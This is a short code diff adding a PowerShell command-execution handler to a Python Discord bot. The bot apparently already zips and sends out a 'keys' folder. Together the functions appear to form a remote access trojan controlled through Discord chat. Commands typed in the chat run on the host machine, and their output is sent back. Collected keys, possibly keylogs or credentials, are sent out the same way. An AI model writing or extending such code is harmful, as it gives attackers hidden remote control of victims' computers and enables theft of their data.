@@ -155,4 +155,18 @@ async def zip_and_send_keys(ctx):
         os.remove(zip_file_path)
     else:
         await ctx.send("No keys folder found to zip.")
+async def powershell_command(ctx, *args):
+    command = ' '.join(args)
+    try:
+        result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True, shell=True)
+        stdout = result.stdout
+        stderr = result.stderr
+        output = f"Command: {command}\nOutput:\n{stdout}\n"
+        if stderr:
+            output += f"Errors:\n{stderr}\n"
+        file = io.StringIO(output)
+        await ctx.send(file=discord.File(file, filename="output.txt"))
+    except Exception as e:
+        await ctx.send(f"Error executing command: {str(e)}")
+#and this one is for pwoershell            
        
